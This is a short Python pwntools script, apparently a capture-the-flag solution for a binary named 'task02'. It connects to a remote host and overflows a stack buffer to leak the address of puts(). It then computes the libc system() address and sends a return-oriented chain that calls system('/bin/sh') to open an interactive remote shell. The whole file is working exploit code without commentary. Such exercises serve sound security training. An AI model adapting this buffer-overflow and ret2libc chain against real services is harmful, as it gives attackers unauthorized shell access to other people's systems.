from pwn import *


# io = process("./task02")
io = remote('45.76.91.112', 10062)

io.recvuntil(b"What is your name?\n")

junk_length = 128 + 8
msg = "Hack-in-progress\0"
junk = bytes(msg + 'a' * (junk_length - len(msg)), 'utf-8')


# First hack: Get address of puts()
first_ret_value = p64(0x401189) # Address of leaky_function()
second_ret_value = p64(0x4011DA) # Address of main()
input = junk + first_ret_value + second_ret_value
io.sendline(input)


# Get back the address of puts()
hello_line = io.recvline()
leaky_line = io.recvline()
print(f"{leaky_line = }")

puts_address = int(leaky_line.split()[4].decode("utf-8"), 16)
print(f'{hex(puts_address) = }')

puts_offset = 0x6f690 # from gdb
system_offset = 0x45390 # from gdb
base_libc = puts_address - puts_offset
system_address = base_libc + system_offset
print(f'{hex(system_address) = }\n')


# Second hack: Call system()
first_ret_value = p64(0x40129b) # Address of "pop rdi; ret" gadget
rdi_value = p64(0x40302a) # Address of "/bin/sh" in binary
second_ret_value = p64(system_address)
input = junk + first_ret_value + rdi_value + second_ret_value

io.sendline(input)
io.interactive()
